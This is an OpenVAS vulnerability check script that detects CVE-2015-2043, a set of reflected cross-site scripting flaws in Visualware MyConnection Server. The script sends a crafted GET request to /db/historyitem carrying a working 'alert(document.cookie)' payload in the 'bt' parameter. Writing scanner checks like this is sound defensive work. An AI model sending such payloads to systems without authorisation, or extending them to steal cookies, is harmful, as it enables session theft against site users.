###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_visualware_mycon_srv_mul_xss.nasl 11424 2018-09-17 08:03:52Z mmartin $
#
# Visualware MyConnection Server Multiple XSS Vulnerabilities
#
# Authors:
# Deepednra Bapna <bdeepednra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805348");
  script_version("$Revision: 11424 $");
  script_cve_id("CVE-2015-2043");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 10:03:52 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2015-03-06 15:09:11 +0530 (Fri, 06 Mar 2015)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Visualware MyConnection Server Multiple XSS Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Visualware
  MyConnection Server and is prone to multiple xss vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple errors exist as input passed via
  'bt', 'variable' and 'et' GET parameter to the 'myspeed/db/historyitem'
  script is not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Visualware MyConnection Server 8.2b");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130490");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", "/myspeed", cgi_dirs(port:http_port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item:string(dir, "/admin"), port:http_port);

  if("MyConnection Server" >< rcvRes && "Visualware, Inc." >< rcvRes
                                     && ">Administration<" >< rcvRes)
  {
    url = dir + "/db/historyitem?bt=%22%27);+alert(document.cookie);+//";

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"alert\(document\.cookie\)", extra_check:"MyConnection Server"))
    {
      report = report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
